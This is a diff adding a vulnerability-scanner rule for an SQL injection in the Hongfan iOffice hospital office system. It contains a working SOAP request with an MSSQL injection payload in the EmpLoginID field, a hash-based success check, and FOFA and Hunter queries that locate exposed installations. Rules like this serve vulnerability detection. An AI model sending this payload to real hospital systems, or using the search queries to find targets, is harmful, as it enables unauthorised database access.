@@ -1,0 +1,26 @@
+name: "!HFiOffice-sqli"         
+rules: 
+  - method: POST               
+    headers:     
+      Content-Type: text/xml;charset=UTF-8 
+    path: /iOffice/prg/set/wss/ioDesktopData.asmx   
+    body: |
+      <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+      <soap:Header/>
+      <soap:Body>
+      <tem:GetDepSchedule>
+      <!--type: string-->
+      <tem:EmpLoginID>1'+(SELECT CHAR(103)+CHAR(105)+CHAR(75)+CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113)+(select sys.fn_varbintohexstr(hashbytes('md5','123')))+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(120)+CHAR(113))))+'</tem:EmpLoginID>
+      </tem:GetDepSchedule>
+      </soap:Body>
+      </soap:Envelope>                    
+    expression:                        
+      status_code: 200                 
+      response_header:              
+      response_body: 202cb962ac59075b  #md5(123)前几位的值               
+detail:                           
+  description: "红帆iOffice ioDesktopData.asmx接口存在SQL注入漏洞。红帆iOffice.net从最早满足医院行政办公需求（传统OA），到目前融合了卫生主管部门的管理规范和众多行业特色应用，是目前唯一定位于解决医院综合业务管理的软件。截至到2024.4.15存在该漏洞的网站较少待验证。"
+  search:             
+    fofa: (app="红帆-ioffice" || app="红帆-HFOffice")
+    鹰图: web.title="HFOffice" or web.body="HFOffice" or web.body="iOffice"...待补充
+    
